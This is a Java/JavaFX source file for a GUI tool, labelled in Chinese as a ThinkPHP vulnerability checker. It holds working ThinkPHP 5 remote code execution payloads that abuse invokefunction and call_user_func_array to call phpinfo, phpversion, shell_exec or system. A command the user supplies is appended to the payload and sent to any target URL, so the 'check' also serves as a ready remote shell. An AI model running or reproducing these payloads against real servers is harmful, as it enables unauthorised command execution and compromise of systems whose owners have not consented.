package com.example.test5;

import javafx.application.Application;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.image.Image;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.VBox;
import javafx.scene.text.Font;
import javafx.scene.text.Text;
import javafx.stage.Stage;

public class HelloApplication extends Application {

    @FXML
    private TextField url;

    @FXML
    private TextArea textAreaVulnerability;

    @FXML
    private TextArea textAreaCommandExecution;

    @FXML
    private ComboBox<String> pocSelector;

    @FXML
    private ComboBox<String> commandSelector; // 新增命令选择器

    private TextField commandInput; // 手动输入命令的 TextField

    private VulnerabilityChecker vulnerabilityChecker;

    @Override
    public void start(Stage primaryStage) {
        VBox root = new VBox(10);
        root.setStyle("-fx-padding: 20; -fx-background-color: #f0f0f0;");
        Scene scene = new Scene(root, 645, 500); // 调整窗口宽度以适应新组件
        scene.getStylesheets().add(getClass().getResource("/styles.css").toExternalForm());
        primaryStage.setScene(scene);
        // 初始化 VulnerabilityChecker
        vulnerabilityChecker = new VulnerabilityChecker();

        // 创建 GridPane 用于放置 URL 和 Command 输入框及其标签
        GridPane gridPane = new GridPane();
        gridPane.setHgap(10);
        gridPane.setVgap(10);


        // 添加 Text 组件
        Text textUrl = new Text("URL:");
        textUrl.setFont(Font.font("Arial", 14));
        Text textCommand = new Text("Command:");
        textCommand.setFont(Font.font("Arial", 14));

        // 添加 TextField 组件
        url = new TextField();
        url.setLayoutX(123);
        url.setPrefWidth(312);
        url.setPromptText("请输入url");

        // 添加 ComboBox 组件
        pocSelector = new ComboBox<>();
        ObservableList<String> pocOptions = FXCollections.observableArrayList(
                "thinkphp5",
                "thinkphp5.0.23"
        );
        pocSelector.setItems(pocOptions);
        pocSelector.setValue("thinkphp5"); // 默认选择第一个 PoC
        pocSelector.setPrefWidth(110); // 设置首选宽度

        // 添加命令选择器 ComboBox 组件
        commandSelector = new ComboBox<>();
        ObservableList<String> commandOptions = FXCollections.observableArrayList(
                "whoami",
                "pwd"
        );
        commandSelector.setItems(commandOptions);
        commandSelector.setValue("whoami"); // 默认选择第一个命令
        commandSelector.setPrefWidth(110); // 设置首选宽度

        // 添加手动输入命令的 TextField 组件
        commandInput = new TextField();
        commandInput.setPromptText("手动输入命令");
        commandInput.setPrefWidth(110); // 设置首选宽度

        // 创建“漏洞验证”按钮
        Button b1 = new Button("漏洞验证");
        b1.setOnAction(this::CheckVul);

        // 创建“命令执行”按钮
        Button b2 = new Button("命令执行");
        b2.setOnAction(this::Command);

        // 将所有组件添加到 GridPane 中
        gridPane.add(textUrl, 0, 0);
        gridPane.add(url, 1, 0);
        gridPane.add(textCommand, 0, 1);
        gridPane.add(commandSelector, 2, 1);
        gridPane.add(commandInput, 1, 1); // 手动输入命令的 TextField
        gridPane.add(pocSelector, 2, 0);
        gridPane.add(b1, 4, 0); // 将“漏洞验证”按钮放在 pocSelector 后面
        gridPane.add(b2, 4, 1); // “命令执行”按钮

        // 添加 TabPane 组件
        TabPane tabPane = new TabPane();
        // 创建第一个 Tab，标题为“检测信息”，用于显示漏洞验证的结果
        Tab tab1 = new Tab("检测信息");
        textAreaVulnerability = new TextArea();
        textAreaVulnerability.setEditable(false);
        tab1.setContent(textAreaVulnerability);

        // 创建第二个 Tab，标题为“命令执行”，用于显示命令执行的结果
        Tab tab2 = new Tab("命令执行");
        textAreaCommandExecution = new TextArea();
        textAreaCommandExecution.setEditable(false);
        tab2.setContent(textAreaCommandExecution);

        // 将两个 Tab 添加到 TabPane 中
        tabPane.getTabs().addAll(tab1, tab2);

        // 设置 TabPane 的位置和大小
        tabPane.setLayoutX(36);
        tabPane.setLayoutY(160);
        tabPane.setPrefWidth(600);
        tabPane.setPrefHeight(500);

        // 将所有组件添加到 VBox 中
        root.getChildren().addAll(gridPane, tabPane);

        // 设置窗口图标
        String imagePath = "/img/icon.jpg";
        Image icon = new Image(getClass().getResourceAsStream(imagePath));
        primaryStage.getIcons().add(icon);

        // 设置窗口标题和场景
        primaryStage.setTitle("thinkphp漏洞检测工具");
        primaryStage.setScene(scene);
        primaryStage.show();
    }

    void CheckVul(ActionEvent event) {
        if (url.getText().isEmpty()) {
            textAreaVulnerability.setText("Url为空，请输入url！！！");
        } else {
            String selectedPoc = pocSelector.getValue();
            String payload = getPayloadForPoc(selectedPoc, "vulnerability");
            String result = vulnerabilityChecker.checkVulnerability(url.getText(), payload);
            if (result.contains("PHP Version")) {
                textAreaVulnerability.appendText(" [+]漏洞存在。 \n");
            } else {
                textAreaVulnerability.appendText(result);
            }
        }
    }

    void Command(ActionEvent event) {
        String command = commandInput.getText().trim(); // 获取手动输入的命令
        if (command.isEmpty()) {
            command = commandSelector.getValue(); // 如果没有手动输入，则使用下拉组件中的命令
        }

        if (command == null || command.isEmpty()) {
            textAreaCommandExecution.setText("命令未选择或输入，请选择或输入一个命令！！！");
        } else {
            String selectedPoc = pocSelector.getValue();
            String payload = getPayloadForPoc(selectedPoc, "command", command);
            String result = vulnerabilityChecker.executeCommand(url.getText(), payload);
            textAreaCommandExecution.setText(result);
        }
    }

    private String getPayloadForPoc(String poc, String type) {
        switch (poc) {
            case "thinkphp5":
                if ("vulnerability".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1";
                }
            case "thinkphp5.0.23":
                if ("vulnerability".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpversion&vars[1][]=1";
                }
            default:
                return "";
        }
    }

    private String getPayloadForPoc(String poc, String type, String command) {
        switch (poc) {
            case "thinkphp5":
                if ("vulnerability".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1";
                } else if ("command".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=" + command;
                }
            case "thinkphp5.0.23":
                if ("vulnerability".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpversion&vars[1][]=1";
                } else if ("command".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + command;
                }
            default:
                return "";
        }
    }

    public static void main(String[] args) {
        launch(args);
    }
}